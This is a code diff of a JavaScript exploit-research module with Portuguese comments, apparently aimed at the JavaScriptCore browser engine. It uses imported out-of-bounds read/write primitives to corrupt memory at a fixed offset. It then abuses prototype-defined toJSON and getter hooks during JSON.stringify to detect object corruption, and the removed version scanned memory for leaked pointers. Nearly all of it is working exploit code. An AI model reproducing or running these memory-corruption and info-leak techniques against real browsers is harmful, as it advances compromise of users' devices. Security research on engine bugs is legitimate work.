@@ -11,160 +11,190 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForSnoopNoZero";
+const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterOnComplex"; // Getter será em ComplexCheckpoint
 let getter_called_flag = false;
-let current_test_results = { success: false, message: "Teste não iniciado.", error: null, snoop_data: [] };
+let current_test_results = { success: false, message: "Teste não iniciado.", error: null, details: "" };
 
 const CORRUPTION_OFFSET = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
 const CORRUPTION_VALUE = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 
-const WIDE_SNOOP_START_OFFSET = 0x0;
-const WIDE_SNOOP_END_OFFSET = 0x100; // Sondar os primeiros 256 bytes
-
-class CheckpointObjectForSnoopNoZero {
+class ComplexCheckpoint {
     constructor(id) {
-        this.id = `SnoopNoZeroCheckpoint-${id}`;
+        this.id_marker = `ComplexCheckpointInstance-${id}`;
+        this.numeric_prop = 0x11223344;
+        this.string_prop = "InitialString";
+        this.object_prop = { a: 10, b: 20 };
+        this.array_prop = [100, 200, 300];
+        try {
+            this.arraybuffer_prop = new ArrayBuffer(32); // Um ArrayBuffer como propriedade
+            new DataView(this.arraybuffer_prop).setUint32(0, 0xABABABAB, true);
+        } catch (e) {
+            logS3(`Erro ao criar arraybuffer_prop no construtor: ${e.message}`, "error", "ComplexCheckpoint");
+            this.arraybuffer_prop = null;
+        }
+        // A propriedade GETTER_CHECKPOINT_PROPERTY_NAME será adicionada ao protótipo
+    }
+
+    // Um método simples para verificar integridade básica se necessário
+    checkSelf() {
+        return `ID: ${this.id_marker}, AB Prop: ${this.arraybuffer_prop ? this.arraybuffer_prop.byteLength : 'null'}`;
     }
 }
 
-export function toJSON_TriggerSnoopNoZeroGetter() {
-    const FNAME_toJSON = "toJSON_TriggerSnoopNoZeroGetter";
-    if (this instanceof CheckpointObjectForSnoopNoZero) {
-        logS3(`toJSON: 'this' é Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
-        try {
-            // eslint-disable-next-line no-unused-vars
-            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
-        } catch (e) {
-            logS3(`toJSON: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
-        }
+export function toJSON_TriggerComplexGetter() { // Esta será a toJSON de ComplexCheckpoint
+    const FNAME_toJSON = "toJSON_TriggerComplexGetter";
+    logS3(`toJSON_TriggerComplexGetter para: ${this.id_marker}. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
+    try {
+        // eslint-disable-next-line no-unused-vars
+        const val = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter no próprio this
+    } catch (e) {
+        logS3(`toJSON_TriggerComplexGetter: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
     }
-    return this.id;
+    // Para JSON.stringify continuar, ele precisa de um objeto serializável ou valor primitivo.
+    // Retornar apenas algumas propriedades para evitar recursão infinita se algo estiver muito quebrado.
+    return {
+        id: this.id_marker,
+        processed_by: FNAME_toJSON
+    };
 }
 
 export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
-    const FNAME_TEST = "executeSnoopNoZeroInGetter"; // Nome interno
-    logS3(`--- Iniciando Teste de Sondagem Ampla (Sem Zerar) no Getter ---`, "test", FNAME_TEST);
+    const FNAME_TEST = "executeComplexCheckpointTest"; // Nome interno
+    logS3(`--- Iniciando Teste com Checkpoint_obj Complexo ---`, "test", FNAME_TEST);
 
     getter_called_flag = false;
-    current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null, snoop_data: [] };
+    current_test_results = { success: false, message: "Teste não executado.", error: null, details: "" };
 
     if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { /* ... validação ... */ return; }
 
-    let toJSONPollutionApplied = false;
-    let getterPollutionApplied = false;
-    let originalToJSONProtoDesc = null;
+    let toJSONPollutionAppliedOnProto = false; // Não vamos poluir Object.prototype desta vez
+    let getterPollutionAppliedOnProto = false;
+    let originalToJSONComplexProtoDesc = null;
     let originalGetterDesc = null;
-    const ppKey_val = 'toJSON';
 
     try {
         await triggerOOB_primitive();
-        if (!oob_array_buffer_real || !oob_dataview_real || !oob_read_absolute || !oob_write_absolute) {
-            current_test_results = { success: false, message: "Falha ao inicializar OOB ou primitivas R/W.", error: "OOB env/primitives not set" };
-            logS3(current_test_results.message, "critical", FNAME_TEST);
-            return;
-        }
+        if (!oob_array_buffer_real || !oob_dataview_real) { /* ... erro ... */ return; }
         logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);
 
-        // NÃO vamos zerar a janela de sondagem desta vez.
-
-        // 1. Realizar a escrita OOB "gatilho"
+        // 1. Realizar a escrita OOB "gatilho" no oob_array_buffer_real
         oob_write_absolute(CORRUPTION_OFFSET, CORRUPTION_VALUE, 8);
-        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET)} com ${CORRUPTION_VALUE.toString(true)} completada.`, "info", FNAME_TEST);
+        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET)} do oob_data completada.`, "info", FNAME_TEST);
 
-        // 2. Configurar o getter e poluir
-        const checkpoint_obj = new CheckpointObjectForSnoopNoZero(1);
-        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForSnoopNoZero.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);
+        // 2. Criar e configurar o ComplexCheckpoint
+        const complex_checkpoint_obj = new ComplexCheckpoint(1);
+        logS3(`ComplexCheckpoint objeto criado. ID: ${complex_checkpoint_obj.id_marker}, AB Length: ${complex_checkpoint_obj.arraybuffer_prop?.byteLength}`, "info", FNAME_TEST);
 
-        Object.defineProperty(CheckpointObjectForSnoopNoZero.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
+        // Salvar descritores originais do protótipo de ComplexCheckpoint
+        originalToJSONComplexProtoDesc = Object.getOwnPropertyDescriptor(ComplexCheckpoint.prototype, 'toJSON');
+        originalGetterDesc = Object.getOwnPropertyDescriptor(ComplexCheckpoint.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);
+
+        // Definir toJSON e o getter diretamente no protótipo de ComplexCheckpoint
+        Object.defineProperty(ComplexCheckpoint.prototype, 'toJSON', {
+            value: toJSON_TriggerComplexGetter,
+            writable: true, enumerable: false, configurable: true
+        });
+        toJSONPollutionAppliedOnProto = true;
+
+        Object.defineProperty(ComplexCheckpoint.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
             get: function() { // Getter SÍNCRONO
                 getter_called_flag = true;
-                const FNAME_GETTER = "SnoopNoZero_Getter";
-                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Sondando memória (sem zerar previamente)...`, "vuln", FNAME_GETTER);
+                const FNAME_GETTER = "ComplexCheckpoint_Getter";
+                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
                 
-                let snoop_results_temp = [];
-                let interesting_values_found = 0;
-
+                let details = [];
+                let corruption_found = false;
                 try {
-                    if (!oob_read_absolute) { /* ... erro ... */ return 0xDEADDEAD; }
-
-                    logS3(`DENTRO DO GETTER: Sondando de ${toHex(WIDE_SNOOP_START_OFFSET)} a ${toHex(WIDE_SNOOP_END_OFFSET)}...`, "info", FNAME_GETTER);
+                    details.push(`ID: ${this.id_marker} (Esperado: ComplexCheckpointInstance-1)`);
+                    details.push(`Numeric Prop: ${toHex(this.numeric_prop)} (Esperado: ${toHex(0x11223344)})`);
+                    details.push(`String Prop: "${this.string_prop}" (Esperado: "InitialString")`);
+                    details.push(`Object Prop Keys: ${this.object_prop ? Object.keys(this.object_prop).join(',') : 'null'} (Esperado: a,b)`);
+                    details.push(`Array Prop Length: ${this.array_prop ? this.array_prop.length : 'null'} (Esperado: 3)`);
                     
-                    for (let offset = WIDE_SNOOP_START_OFFSET; offset < WIDE_SNOOP_END_OFFSET; offset += 8) { // Ler de 8 em 8 bytes
-                        if (offset < 0 || (offset + 8) > oob_array_buffer_real.byteLength) {
-                            continue;
+                    if (this.arraybuffer_prop) {
+                        details.push(`AB Prop byteLength: ${this.arraybuffer_prop.byteLength} (Esperado: 32)`);
+                        if (this.arraybuffer_prop.byteLength !== 32) {
+                            corruption_found = true;
+                            logS3("CORRUPÇÃO: this.arraybuffer_prop.byteLength alterado!", "vuln", FNAME_GETTER);
                         }
                         try {
-                            const value_read = oob_read_absolute(offset, 8); // Ler 8 bytes
-                            const value_is_corruption_val = (offset === CORRUPTION_OFFSET && value_read instanceof AdvancedInt64 && value_read.equals(CORRUPTION_VALUE));
-                            
-                            // Logar apenas valores não-zero (ou o valor da corrupção)
-                            // Se o buffer não foi zerado, esperamos ver o conteúdo inicial ou lixo.
-                            if (!value_read.equals(AdvancedInt64.Zero) || value_is_corruption_val) {
-                                const value_str = value_read instanceof AdvancedInt64 ? value_read.toString(true) : toHex(value_read, 64);
-                                snoop_results_temp.push({offset: toHex(offset), value: value_str});
-                                logS3(`SNOOP_NOZERO: oob_data[${toHex(offset)}] = ${value_str}`, "leak", FNAME_GETTER);
-                                if (!value_is_corruption_val && !value_read.equals(AdvancedInt64.Zero)) {
-                                    // Aplicar heurística de ponteiro aqui
-                                    if (value_read instanceof AdvancedInt64 && (value_read.high() > 0x00010000 || value_read.high() < 0) && value_read.high() !== 0xFFFFFFFF) {
-                                        logS3(`SNOOP_NOZERO: VALOR SUSPEITO (possível ponteiro?) em ${toHex(offset)}: ${value_str}`, "vuln", FNAME_GETTER);
-                                        interesting_values_found++;
-                                    } else if (! (value_read instanceof AdvancedInt64) && value_read > 0x100000000){ // number
-                                         logS3(`SNOOP_NOZERO: VALOR SUSPEITO (possível ponteiro?) em ${toHex(offset)}: ${value_str}`, "vuln", FNAME_GETTER);
-                                        interesting_values_found++;
-                                    }
-                                }
+                            const dv = new DataView(this.arraybuffer_prop);
+                            details.push(`AB Prop[0] (u32): ${toHex(dv.getUint32(0,true))} (Esperado: ${toHex(0xABABABAB)})`);
+                            if (dv.getUint32(0,true) !== 0xABABABAB) {
+                                corruption_found = true;
+                                logS3("CORRUPÇÃO: Conteúdo de this.arraybuffer_prop alterado!", "vuln", FNAME_GETTER);
                             }
-                        } catch (e_read) {
-                            logS3(`SNOOP_NOZERO: Erro ao ler oob_data[${toHex(offset)}]: ${e_read.message}`, "error", FNAME_GETTER);
-                            snoop_results_temp.push({offset: toHex(offset), value: `ERRO_LEITURA: ${e_read.message}`});
+                        } catch (e_dv) {
+                            details.push(`AB Prop: Erro ao usar DataView: ${e_dv.message}`);
+                            corruption_found = true;
+                            logS3(`CORRUPÇÃO: Erro ao usar DataView em this.arraybuffer_prop: ${e_dv.message}`, "vuln", FNAME_GETTER);
                         }
-                    }
-                    current_test_results.snoop_data = snoop_results_temp;
-                    if (interesting_values_found > 0) {
-                        current_test_results.success = true;
-                        current_test_results.message = `Sondagem (sem zerar) encontrou ${interesting_values_found} valor(es) suspeito(s).`;
                     } else {
-                        current_test_results.message = "Sondagem (sem zerar) completada, nenhum vazamento óbvio ou valor inesperado encontrado.";
+                        details.push("AB Prop é null!");
+                        corruption_found = true; // Se era esperado e agora é null
+                         logS3("CORRUPÇÃO: this.arraybuffer_prop é null!", "vuln", FNAME_GETTER);
+                    }
+
+                    if (corruption_found) {
+                        current_test_results = { success: true, message: "Corrupção observada nas propriedades de ComplexCheckpoint!", error: null, details: details.join('; ') };
+                    } else {
+                        current_test_results = { success: false, message: "Nenhuma corrupção óbvia nas propriedades de ComplexCheckpoint.", error: null, details: details.join('; ') };
                     }
 
                 } catch (e) {
-                    logS3(`DENTRO DO GETTER: ERRO GERAL durante sondagem: ${e.message}`, "error", FNAME_GETTER);
-                    current_test_results.error = String(e);
-                    current_test_results.message = `Erro geral na sondagem: ${e.message}`;
+                    logS3(`DENTRO DO GETTER: ERRO GERAL ao inspecionar 'this': ${e.message}`, "error", FNAME_GETTER);
+                    current_test_results = { success: false, message: `Erro geral inspecionando 'this': ${e.message}`, error: String(e), details: details.join('; ') };
                 }
-                return 0xBADF00D;
+                return 0xBADF00D; // Getter precisa retornar algo
             },
             configurable: true
         });
-        getterPollutionApplied = true;
+        getterPollutionAppliedOnProto = true;
+        logS3(`toJSON e getter definidos no protótipo de ComplexCheckpoint.`, "info", FNAME_TEST);
 
-        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
-        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerSnoopNoZeroGetter, writable: true, enumerable: false, configurable: true});
-        toJSONPollutionApplied = true;
-        logS3(`Poluições aplicadas.`, "info", FNAME_TEST);
-
-        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST);
+        // 3. Chamar JSON.stringify no objeto complexo
+        logS3(`Chamando JSON.stringify(complex_checkpoint_obj)...`, "info", FNAME_TEST);
+        let stringify_result = null;
         try {
-            JSON.stringify(checkpoint_obj);
+            stringify_result = JSON.stringify(complex_checkpoint_obj);
+            logS3(`JSON.stringify completado. Resultado: ${stringify_result}`, "info", FNAME_TEST);
         } catch (e) {
             logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
+            if (!getter_called_flag) { // Se o erro ocorreu antes do getter
+                 current_test_results.message = `Erro em JSON.stringify antes do getter: ${e.message}`;
+                 current_test_results.error = String(e);
+            }
         }
 
-    } catch (mainError) { /* ... erro principal ... */ }
-    finally { /* ... limpeza ... */ }
+    } catch (mainError) {
+        logS3(`Erro principal: ${mainError.message}`, "critical", FNAME_TEST);
+        console.error(mainError);
+        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError), details:"" };
+    } finally {
+        // Restauração
+        if (toJSONPollutionAppliedOnProto && ComplexCheckpoint.prototype.hasOwnProperty('toJSON')) {
+            delete ComplexCheckpoint.prototype.toJSON;
+            if(originalToJSONComplexProtoDesc) Object.defineProperty(ComplexCheckpoint.prototype, 'toJSON', originalToJSONComplexProtoDesc);
+        }
+        if (getterPollutionAppliedOnProto && ComplexCheckpoint.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) {
+             delete ComplexCheckpoint.prototype[GETTER_CHECKPOINT_PROPERTY_NAME];
+            if(originalGetterDesc) Object.defineProperty(ComplexCheckpoint.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc);
+        }
+        logS3("Limpeza de protótipo de ComplexCheckpoint finalizada.", "info", "CleanupFinal");
+    }
 
     if (getter_called_flag) {
         if (current_test_results.success) {
-            logS3(`RESULTADO SONDAGEM (SEM ZERAR): ${current_test_results.message}`, "vuln", FNAME_TEST);
+            logS3(`RESULTADO TESTE COMPLEX CHECKPOINT: ${current_test_results.message}`, "vuln", FNAME_TEST);
         } else {
-            logS3(`RESULTADO SONDAGEM (SEM ZERAR): Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
+            logS3(`RESULTADO TESTE COMPLEX CHECKPOINT: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
         }
-        logS3("Dados Sondados (Offset: Valor) - Apenas não-zero ou valor da corrupção:", "info", FNAME_TEST);
-        current_test_results.snoop_data.forEach(item => {
-            logS3(`  ${item.offset}: ${item.value}`, "info", FNAME_TEST);
-        });
-    } else { /* ... getter não chamado ... */ }
+        logS3(`Detalhes da inspeção do ComplexCheckpoint: ${current_test_results.details}`, "info", FNAME_TEST);
+    } else {
+        logS3("RESULTADO TESTE COMPLEX CHECKPOINT: Getter NÃO foi chamado.", "error", FNAME_TEST);
+    }
+    // logS3(`  Detalhes finais JSON: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);
 
     clearOOBEnvironment();
-    logS3(`--- Teste de Sondagem Ampla (Sem Zerar) Concluído ---`, "test", FNAME_TEST);
+    logS3(`--- Teste com Checkpoint_obj Complexo Concluído ---`, "test", FNAME_TEST);
 }
